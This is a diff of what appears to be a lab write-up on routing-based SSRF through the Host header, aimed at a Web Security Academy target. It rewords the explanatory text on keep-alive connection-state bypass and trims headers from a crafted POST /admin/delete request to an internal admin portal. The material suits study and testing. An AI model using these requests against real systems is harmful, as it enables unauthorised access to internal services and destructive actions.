@@ -499,7 +499,7 @@ X-Forwarded-Server: EXPLOIT.net
 
 ### HOST Connection State  
 
->Target is vulnerable to **routing-based SSRF** via the Host header. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.  
+>Target is vulnerable to **routing-based SSRF** via the Host header, but validate connection state of the first request. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.  
 
 ```html
 GET /intranet/service HTTP/1.1
@@ -1375,7 +1375,7 @@ Host: 192.168.0.§0§
   
 ![Routing-based SSRF](images/Routing-based-SSRF.png)  
 
->**Note:** Once access gained access to internal server admin portal, the form require POST request, so we convert the GET request to POST as below.  
+>**Note:** Once access gained to the internal server admin portal, the response indicate the form requires a POST request and CSRF token, so we convert the GET request to POST as below.  
 
 ```html
 POST /admin/delete HTTP/1.1
@@ -1387,10 +1387,6 @@ Sec-Ch-Ua-Platform: "Linux"
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
 Referer: https://TARGET.web-security-academy.net/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
